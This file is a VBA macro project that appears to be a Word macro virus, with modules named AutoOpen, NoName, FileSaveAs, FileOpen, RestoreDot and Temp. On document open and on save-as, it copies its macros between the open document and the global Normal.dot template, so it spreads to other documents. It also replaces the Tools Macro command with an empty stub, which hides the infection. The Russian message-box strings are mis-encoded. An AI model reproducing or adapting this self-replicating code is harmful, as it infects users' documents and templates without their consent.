   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "RestoreDot"

   Public Sub MAIN()
   WordBasic.Organizer Delete:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="FileOpen", Tab:=3
   WordBasic.Organizer Delete:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="FileSaveAs", Tab:=3
   WordBasic.Organizer Delete:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="NoName", Tab:=3
   WordBasic.Organizer Delete:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="FileSave", Tab:=3
   WordBasic.Organizer Delete:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="ToolsMacro", Tab:=3
   WordBasic.MsgBox "Òåïåðü ãðîõíè â Macro RestoreDot!", "Ñ÷àñòüå ïðèâàëèëî?", 32
   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Dim x
   Dim name_$
   Dim dot
   Dim prefix$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   Rem Dlg.Format = 1
   x = WordBasic.Dialog.FileSaveAs(dlg)
   If x = 0 Then GoTo quit
   name_$ = dlg.Name
   dot = InStr(name_$, ".")
   If dot > 1 Then prefix$ = WordBasic.[Left$](name_$, dot - 1)
   name_$ = prefix$ + ".doc"
   Rem MsgBox Name$
   WordBasic.FileSaveAs Name:=name_$, Format:=1

   On Error GoTo -1: On Error GoTo ErrorHandler
   Rem Organizer .Copy, .Source = FileName$(), .Destination = DefaultDir$(2) + "\Normal.dot", .Name = "FileSaveAs", .Tab = 3
   Rem MsgBox "Ok!"
   Rem Goto exit
   ErrorHandler:
   Rem MsgBox "Error"
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=WordBasic.[FileName$](), Name:="NoName", Tab:=3
   On Error GoTo -1: On Error GoTo exist
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="RestoreDot", Tab:=3
   GoTo exit_
   exist:
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=WordBasic.[FileName$](), Name:="RestoreDot", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=WordBasic.[FileName$](), Name:="FileSave", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=WordBasic.[FileName$](), Name:="FileSaveAs", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=WordBasic.[FileName$](), Name:="NoName", NewName:="AutoOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=WordBasic.[FileName$](), Name:="NoName", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=WordBasic.[FileName$](), Name:="FileOpen", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=WordBasic.[FileName$](), Name:="ToolsMacro", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=WordBasic.[FileName$](), Name:="ToolsMacro", NewName:="Temp", Tab:=3
   exit_:
   quit:
   End Sub

   Attribute VB_Name = "FileOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Îòêðûòèå ñóùåñòâóþùåãî äîêóìåíòà èëè øàáëîíà"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
   WordBasic.CurValues.FileOpen dlg
   Err.Number = WordBasic.Dialog.FileOpen(dlg)
   If Err.Number = 0 Then GoTo exit_
   WordBasic.FileOpen dlg
   WordBasic.MsgBox "×èòàåøü?", 32
   GoTo quit
   exit_:
   WordBasic.MsgBox "×òî ôàéë íå îòêðûâàåøü?", 64
   quit:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo ErrorHandler
   Rem MacroCopy DefaultDir$(2) + "\Normal.dot", FileName$() : "NoName"
   Rem Organizer .Copy, .Source = DefaultDir$(2) + "\Normal.dot", .Destination = FileName$(), .Name = "NoName", .Tab = 3
   Rem Goto exit
   On Error GoTo -1: On Error GoTo exit_
   ErrorHandler:
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="RestoreDot", Tab:=3
   On Error GoTo -1: On Error GoTo exist
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=WordBasic.[FileName$](), Name:="NoName", Tab:=3
   GoTo exit_
   exist:
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="AutoOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="FileOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="FileSave", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="FileSaveAs", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="Temp", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="AutoOpen", NewName:="NoName", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="Temp", NewName:="ToolsMacro", Tab:=3
   exit_:
   End Sub

   Attribute VB_Name = "NoName"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo ErrorHandler
   Rem MacroCopy DefaultDir$(2) + "\Normal.dot", FileName$() : "NoName"
   Rem Organizer .Copy, .Source = DefaultDir$(2) + "\Normal.dot", .Destination = FileName$(), .Name = "NoName", .Tab = 3
   Rem Goto exit
   On Error GoTo -1: On Error GoTo exit_
   ErrorHandler:
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="RestoreDot", Tab:=3
   On Error GoTo -1: On Error GoTo exist
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Destination:=WordBasic.[FileName$](), Name:="NoName", Tab:=3
   GoTo exit_
   exist:
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="AutoOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="FileOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="FileSave", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="FileSaveAs", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="Temp", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="AutoOpen", NewName:="NoName", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Name:="Temp", NewName:="ToolsMacro", Tab:=3
   exit_:
   End Sub

   Attribute VB_Name = "Temp"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "F%82"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Temp.MAIN"
   End Sub
